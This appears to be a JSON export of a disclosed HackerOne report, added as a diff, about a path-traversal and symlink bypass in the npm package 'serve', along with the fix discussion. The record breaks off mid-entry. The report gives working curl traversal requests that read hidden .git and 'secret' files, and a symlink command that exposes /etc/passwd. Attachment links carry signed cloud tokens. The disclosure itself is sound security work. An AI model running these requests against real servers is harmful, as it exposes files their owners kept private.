@@ -1,0 +1,723 @@
+{
+  "id": 486933,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80ODY5MzM=",
+  "url": "https://hackerone.com/reports/486933",
+  "title": "[serve] Access unlisted internal files/folders revealing sensitive information",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2019-01-27T15:55:48.066Z",
+  "submitted_at": "2019-01-27T15:55:48.066Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "skyn3t",
+    "url": "/skyn3t",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/224/816/14988b1087907275d769481dc45fe6576ce0d206_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-02-07T21:22:35.524Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2019-02-07T21:22:27.729Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report sensitive information disclosure in serve.\nBypass of #308721 in ways.\n\n# Module\n\n**module name:** serve\n**version:** 10.1.1\n**npm page:** `https://www.npmjs.com/package/serve\n\n## Module Description\n\nAssuming you would like to serve a static site, single page application or just a static file (no matter if on your device or on the local network), this package is just the right choice for you.\n\nIt behaves exactly like static deployments on Now, so it's perfect for developing your static project. Then, when it's time to push it into production, you deploy it.\n\nFurthermore, it provides a neat interface for listing the directory's contents\n\n## Module Stats\n\n**weekly downloads**\n138,377\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe `serve` modules allows directory browsing and to serve static files through the browser.\nThe config options `unlisted` and `rewrites` can be used to tell the module which file or directory are forbidden and should not be served. \nrefer: https://github.com/zeit/serve-handler/issues/48\nThis rule can be bypassed using the technique below which can lead to sensitive information disclosure (An interesting example: https://smitka.me/).\n\n## Steps To Reproduce:\n\n- Install `serve`\n```\n$ npm install -g serve\n```\n\n- Inside a project directory, initialise `git` and create `404.html`.\n```\n$ git init\n$ echo \"404 Not Found\" > 404.html\n$ echo \"secret text\" > secret\n```\n\n- Add rule to ignore `.git` folder in `serve.json`\n```json\n{\n    \"rewrites\": [\n        { \"source\": \".git/**\", \"destination\": \"/404.html\" },\n        { \"source\": \"secret\", \"destination\": \"/404.html\" }\n      ],\n    \"unlisted\": [\n      \".git\"\n    ]\n  }\n```\n\n- Start `serve` in current directory.\n\n```\n$ serve\nINFO: Discovered configuration in `serve.json`\n   ┌───────────────────────────────────────────────┐\n   │                                               │\n   │   Serving!                                    │\n   │                                               │\n   │   - Local:            http://localhost:5000   │\n   │   - On Your Network:  http://127.0.1.1:5000   │\n   │                                               │\n   │   Copied local address to clipboard!          │\n   │                                               │\n   └───────────────────────────────────────────────┘\n```\n\n- Now, current directory will be served by `serve` with the exception of folder `.git` and file `secret`.\n- If we try to curl `.git`or `secret` we get a Not Found error\n```\n$ curl http://localhost:5000/.git --path-as-is     \n404 Not Found\n$ curl http://localhost:5000/secret --path-as-is\n404 Not Found\n```\n\n- Although if we request any other url and then navigate back to the forbidden files/folders using `../` scheme, we are able to extract it's contents successfully.\n```\n$ curl http://localhost:5000/any/../.git/HEAD --path-as-is\nref: refs/heads/master\n$ curl http://localhost:5000/any/../secret --path-as-is   \nsecret text\n```\n\n\n## Supporting Material/References:\n\n- Ubuntu 16.04\n- node v11.3.0\n- npm 6.7.0\n\n# Wrap up\n\n\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nThe essentially bypasses the `unlisted` and `rewrites` files/folders feature and allows an attacker to read from a directory/file that the victim has not allowed access to.\n\n**References:**\n- https://github.com/zeit/serve-handler#options\n- https://github.com/zeit/serve-handler/issues/48",
+  "weakness": {
+    "id": 89,
+    "name": "Information Exposure Through Directory Listing"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+
+  ],
+  "allow_singular_disclosure_at": "2019-03-09T21:22:27.828Z",
+  "allow_singular_disclosure_after": -143288589.28407374,
+  "singular_disclosure_allowed": true,
+  "vote_count": 13,
+  "voters": [
+    "bughunterninja",
+    "sameerphad72",
+    "bl4de",
+    "skyn3t",
+    "savitar0x01",
+    "eveeez",
+    "khizer47",
+    "codeanddecode",
+    "cyberunit",
+    "gtrgef",
+    "and 3 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 5006,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "serve",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 4046544,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hello,\nThanks for reporting this to us. Someone will quickly look at this report and triage it.",
+      "automated_response": true,
+      "created_at": "2019-01-27T15:55:54.037Z",
+      "updated_at": "2019-01-27T15:55:54.037Z",
+      "actor": {
+        "username": "vdeturckheim_dev",
+        "cleared": false,
+        "verified": false,
+        "url": "/vdeturckheim_dev",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 4048372,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "@skyn3t \n\nThanks for reporting this issue.\n\nI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\nI will invite the package maintainer to this issue.\n",
+      "automated_response": false,
+      "created_at": "2019-01-28T07:54:21.005Z",
+      "updated_at": "2019-01-28T07:54:21.005Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 4048373,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-01-28T07:55:00.710Z",
+      "updated_at": "2019-01-28T07:55:00.710Z",
+      "additional_data": {
+        "old_severity": "Critical",
+        "new_severity": "Critical (9.3)",
+        "old_severity_id": 287418,
+        "new_severity_id": 287581
+      },
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 4050114,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey Marcin,\nThanks for the quick response. Any reason why #308721(9.3) and #330650 (10) should be different in terms of severity?\nAlso what should be the correct score for this report , being similar in nature to both?",
+      "automated_response": false,
+      "created_at": "2019-01-28T13:51:19.101Z",
+      "updated_at": "2019-01-28T13:51:19.101Z",
+      "actor": {
+        "username": "skyn3t",
+        "cleared": false,
+        "verified": false,
+        "url": "/skyn3t",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/224/816/14988b1087907275d769481dc45fe6576ce0d206_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 4083246,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Never mind the above comment",
+      "automated_response": false,
+      "created_at": "2019-02-02T08:21:39.700Z",
+      "updated_at": "2019-02-02T08:21:39.700Z",
+      "actor": {
+        "username": "skyn3t",
+        "cleared": false,
+        "verified": false,
+        "url": "/skyn3t",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/224/816/14988b1087907275d769481dc45fe6576ce0d206_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 4092829,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ExternalUserJoined",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-02-04T22:04:44.658Z",
+      "updated_at": "2019-02-04T22:04:44.658Z",
+      "actor": {
+        "username": "notquiteleo",
+        "cleared": false,
+        "verified": false,
+        "url": "/notquiteleo",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/234/441/a2d834813f466cd073def4b1f346275259f6522f_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 4092833,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thank you for reporting this issue. We are issuing a fix!",
+      "automated_response": false,
+      "created_at": "2019-02-04T22:05:24.373Z",
+      "updated_at": "2019-02-04T22:05:24.373Z",
+      "actor": {
+        "username": "notquiteleo",
+        "cleared": false,
+        "verified": false,
+        "url": "/notquiteleo",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/234/441/a2d834813f466cd073def4b1f346275259f6522f_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 4094145,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey @notquiteleo ,\n\nAlso wanted to bring this to your attention.\n\nSymlinks in `serve` can be used to download/traverse any file or path in server root.\n\n###POC\n\n1. Create a symlink inside your project directory\n```\n$ ln -s ../../../../../etc/passwd sympasswd\n```\n\n2. Run serve in the project directory\n```\n$ serve\n```\n\n**Result:** You can access `/etc/passwd` through `serve` via symlink that was created. This can also be used to bypass `unlisted` and `rewrites` feature.\n\n###Recommendations\n1. Validating symlinks in serve.\n2. Providing users a flag to turn following of symlinks On/Off if required.",
+      "automated_response": false,
+      "created_at": "2019-02-05T06:49:21.110Z",
+      "updated_at": "2019-02-05T06:49:21.110Z",
+      "actor": {
+        "username": "skyn3t",
+        "cleared": false,
+        "verified": false,
+        "url": "/skyn3t",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/224/816/14988b1087907275d769481dc45fe6576ce0d206_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 418124,
+          "filename": "sympasswd.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/418/124/ab97fef4a593da1f8ad69022c47f1e2d744f5bf9/sympasswd.png?response-content-disposition=attachment%3B%20filename%3D%22sympasswd.png%22%3B%20filename%2A%3DUTF-8%27%27sympasswd.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6MB2MFGG%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074537Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJIMEYCIQCYIr2SSYJfi35%2Bx%2Fejzst0Y9ig0v%2FJscMh9NmdM4t5VAIhAM3tVHHjt2e0sz7iLl%2BDuXOX6%2B7Qkvgs1KealcH7ElMXKrIFCCkQAxoMMDEzNjE5Mjc0ODQ5IgxubweTaMPp5L8Q1YQqjwX98aLIa%2F1BpdVLQC%2BToIBwbGklZ8ygTNCI4x1qYQEmOGsQ1%2F6p4MCPMLXSqoXVF5QxpRt%2BdZrK%2FNcRu%2FY3QoE9gFJoqRHKBQN0hea7VJkz7uo3Rwjv0%2Bs1TjLNvF9Gx9DxVw5gmaNJzFBUsDj05h8b86dmkhqjUzC21gXGs9t4qXslxrGTOenOwfga0eb8fEHnz%2FUG0yD%2FjVQklap45v4C30R4WSycoTBHd2IKfDAZJaqt3smArxbtWItscCWCfFJ5YbB9hQ02lZMGvLB8srO38zC0kWDBR3RWPsI8%2FCT9AQl3xDcTmEbRo8%2BEfRAGkXLHOo5AKqatyHEmPm882mSsghu%2Brspdz%2FeqOhEpYUj4ySBMH0b17ZliROXJKxLzh%2BCpk4fUxbvq89yWnq1oE%2FG%2BGZ8LqH%2BHdDoUgMjnt03ecbuj8wAqebD0M9EeKqj1vXVd7ZWocJ%2FV6oYrm7S7UQivyKhDfuckG4YQxqwGm504IsXFkkTNFI0%2FbAlQyc8oZWIdoVgeThWvi6pw0uZ7M%2BmXEBvYfmy7YzbRIQolLeZ2Ib2tXdc%2Bn5HFgml1zzqu2ZZ8UvtnGce7z5fSnCBmszEnO8llVSoINOleTxGjyvKpO7VdXBdZ6vHaJIqLP4SNZcKEx5MZL7DunikcKcJc1Dh%2BeVNTGBTEwRQo2kmUtWbkmUUiASlDd8HgSnAP4RZOLdiDukVkx7gl6gOh42A5qWddn32TVRG2IDpeFfTYENewkfdTm7VCYmxkxmsP3Y%2Fcw%2BNkYV5PmiGgPIv2Zg9PDt27P3dzVbO0BkrT2UairLaxhj6VzUa%2BsdGMoet2DUfQzKVnGNHKxUFEljtFY%2FFiJHinwQ9Y75x2c9j9UzL1wI6TMI2luqgGOrABYyeNRUxeluFl7y58tZIFLbCliCc92oq3AvL8gskghuI3JnKg7R1ezYwY7GVa14ik6vEtnhisXGNuJh6mNjwDpIIr2%2BnDJR4O60ugIm%2B2U5%2B3g%2BQpzkDorZygbT57TjRGr122tik3dcMk17NAyWA%2FDaZNLlJwiU%2BS%2FxyTsJLLALvI9zlCoPT7U9wokT6nPEdV1VKFKSAm9jewkYUEeI%2FFWCVu2DqEd9C51abS8Y6I8lw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bba2af5abb360e113116b533707fb4ab37e2b29a5e80c359946f6699b35b52e6"
+        },
+        {
+          "id": 418123,
+          "filename": "serve-dir.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/418/123/4e6ff5bb8cfb43cc9824187672a649100fd6dc38/serve-dir.png?response-content-disposition=attachment%3B%20filename%3D%22serve-dir.png%22%3B%20filename%2A%3DUTF-8%27%27serve-dir.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6MB2MFGG%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074537Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJIMEYCIQCYIr2SSYJfi35%2Bx%2Fejzst0Y9ig0v%2FJscMh9NmdM4t5VAIhAM3tVHHjt2e0sz7iLl%2BDuXOX6%2B7Qkvgs1KealcH7ElMXKrIFCCkQAxoMMDEzNjE5Mjc0ODQ5IgxubweTaMPp5L8Q1YQqjwX98aLIa%2F1BpdVLQC%2BToIBwbGklZ8ygTNCI4x1qYQEmOGsQ1%2F6p4MCPMLXSqoXVF5QxpRt%2BdZrK%2FNcRu%2FY3QoE9gFJoqRHKBQN0hea7VJkz7uo3Rwjv0%2Bs1TjLNvF9Gx9DxVw5gmaNJzFBUsDj05h8b86dmkhqjUzC21gXGs9t4qXslxrGTOenOwfga0eb8fEHnz%2FUG0yD%2FjVQklap45v4C30R4WSycoTBHd2IKfDAZJaqt3smArxbtWItscCWCfFJ5YbB9hQ02lZMGvLB8srO38zC0kWDBR3RWPsI8%2FCT9AQl3xDcTmEbRo8%2BEfRAGkXLHOo5AKqatyHEmPm882mSsghu%2Brspdz%2FeqOhEpYUj4ySBMH0b17ZliROXJKxLzh%2BCpk4fUxbvq89yWnq1oE%2FG%2BGZ8LqH%2BHdDoUgMjnt03ecbuj8wAqebD0M9EeKqj1vXVd7ZWocJ%2FV6oYrm7S7UQivyKhDfuckG4YQxqwGm504IsXFkkTNFI0%2FbAlQyc8oZWIdoVgeThWvi6pw0uZ7M%2BmXEBvYfmy7YzbRIQolLeZ2Ib2tXdc%2Bn5HFgml1zzqu2ZZ8UvtnGce7z5fSnCBmszEnO8llVSoINOleTxGjyvKpO7VdXBdZ6vHaJIqLP4SNZcKEx5MZL7DunikcKcJc1Dh%2BeVNTGBTEwRQo2kmUtWbkmUUiASlDd8HgSnAP4RZOLdiDukVkx7gl6gOh42A5qWddn32TVRG2IDpeFfTYENewkfdTm7VCYmxkxmsP3Y%2Fcw%2BNkYV5PmiGgPIv2Zg9PDt27P3dzVbO0BkrT2UairLaxhj6VzUa%2BsdGMoet2DUfQzKVnGNHKxUFEljtFY%2FFiJHinwQ9Y75x2c9j9UzL1wI6TMI2luqgGOrABYyeNRUxeluFl7y58tZIFLbCliCc92oq3AvL8gskghuI3JnKg7R1ezYwY7GVa14ik6vEtnhisXGNuJh6mNjwDpIIr2%2BnDJR4O60ugIm%2B2U5%2B3g%2BQpzkDorZygbT57TjRGr122tik3dcMk17NAyWA%2FDaZNLlJwiU%2BS%2FxyTsJLLALvI9zlCoPT7U9wokT6nPEdV1VKFKSAm9jewkYUEeI%2FFWCVu2DqEd9C51abS8Y6I8lw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8f050b4f82ff83754d48d16298a033f5c061802385af5e15e9fdee579322a1ea"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 4099329,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ExternalUserJoined",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-02-05T21:19:55.887Z",
+      "updated_at": "2019-02-05T21:19:55.887Z",
+      "actor": {
+        "username": "andybitz",
+        "cleared": false,
+        "verified": false,
+        "url": "/andybitz",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/491/107/789c9735a44358ecfe090fbbe295c52bc7e90c1d_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 4099355,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "We just released version `5.0.8` of `serve-handler` which includes a fix for the vulnerability.\n\nThank you for reporting!",
+      "automated_response": false,
+      "created_at": "2019-02-05T21:26:15.427Z",
+      "updated_at": "2019-02-05T21:26:15.427Z",
+      "actor": {
+        "username": "andybitz",
+        "cleared": false,
+        "verified": false,
+        "url": "/andybitz",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/491/107/789c9735a44358ecfe090fbbe295c52bc7e90c1d_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 4101558,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@andybitz Thanks! \n\n@skyn3t Will you have the capacity to re-test the fix?\n\nI will be more than happy to disclose when we have a confirmation that the fix works.",
+      "automated_response": false,
+      "created_at": "2019-02-06T08:56:31.884Z",
+      "updated_at": "2019-02-06T08:56:31.884Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 4101868,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey @andybitz ,\nDon't forget to upgrade `serve`",
+      "automated_response": false,
+      "created_at": "2019-02-06T10:14:31.443Z",
+      "updated_at": "2019-02-06T10:14:31.443Z",
+      "actor": {
+        "username": "skyn3t",
+        "cleared": false,
+        "verified": false,
+        "url": "/skyn3t",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/224/816/14988b1087907275d769481dc45fe6576ce0d206_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 4101893,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "We just published version `10.1.2` of `serve` with this change.\n\nhttps://github.com/zeit/serve/releases/tag/10.1.2",
+      "automated_response": false,
+      "created_at": "2019-02-06T10:24:52.140Z",
+      "updated_at": "2019-02-06T10:24:52.140Z",
+      "actor": {
+        "username": "notquiteleo",
+        "cleared": false,
+        "verified": false,
+        "url": "/notquiteleo",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/234/441/a2d834813f466cd073def4b1f346275259f6522f_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 4102043,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@marcinhoppe , I was able to verify that the fix works!",
+      "automated_response": false,
+      "created_at": "2019-02-06T11:11:23.906Z",
+      "updated_at": "2019-02-06T11:11:23.906Z",
+      "actor": {
+        "username": "skyn3t",
+        "cleared": false,
+        "verified": false,
+        "url": "/skyn3t",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/224/816/14988b1087907275d769481dc45fe6576ce0d206_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 4103186,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@skyn3t How can we reward you for this report? Does HackerOne have a built-in mechanism for that?",
+      "automated_response": false,
+      "created_at": "2019-02-06T14:28:45.664Z",
+      "updated_at": "2019-02-06T14:28:45.664Z",
+      "actor": {
+        "username": "notquiteleo",
+        "cleared": false,
+        "verified": false,
+        "url": "/notquiteleo",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/234/441/a2d834813f466cd073def4b1f346275259f6522f_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 4103661,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@notquiteleo that's kind of you! I'm checking with H1 if there's something internal we can do within this report.",
+      "automated_response": false,
+      "created_at": "2019-02-06T15:55:21.719Z",
+      "updated_at": "2019-02-06T15:55:21.719Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 4104204,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Yeah that's great @notquiteleo \nThanks @lirantal for looking into this!",
+      "automated_response": false,
+      "created_at": "2019-02-06T17:27:34.093Z",
+      "updated_at": "2019-02-06T17:27:34.093Z",
+      "actor": {
+        "username": "skyn3t",
+        "cleared": false,
+        "verified": false,
+        "url": "/skyn3t",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/224/816/14988b1087907275d769481dc45fe6576ce0d206_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 4104492,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "marcinhoppe had your back on this! ;-)\ngreat job you guys on this handling this report start-to-end",
+      "automated_response": false,
+      "created_at": "2019-02-06T18:22:55.685Z",
+      "updated_at": "2019-02-06T18:22:55.685Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 4105201,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @notquiteleo. As this particular program (@nodejs-ecosystem) is run by the Node.js Security WG, any bounties would need to come via them. If you wish to reward a researcher directly as the maintainer of the node module in question, one option is to sign-up for the free [HackerOne Community Edition](https://www.hackerone.com/product/community) for [serve](https://github.com/zeit/serve) and then pay a bounty via that separate program. We can even clone (or move, if the ecosystem team wishes) this report to make it easier. Would that work for you?",
+      "automated_response": false,
+      "created_at": "2019-02-06T19:35:02.448Z",
+      "updated_at": "2019-02-06T19:35:02.448Z",
+      "actor": {
+        "username": "reed",
+        "cleared": false,
+        "verified": false,
+        "url": "/reed",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 4111936,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "@skyn3t @notquiteleo @andybitz @lirantal @reed Good job everyone! This was one of the smoothest reports I have ever seen. I will proceed with the disclosure.",
+      "automated_response": false,
+      "created_at": "2019-02-07T21:22:20.075Z",
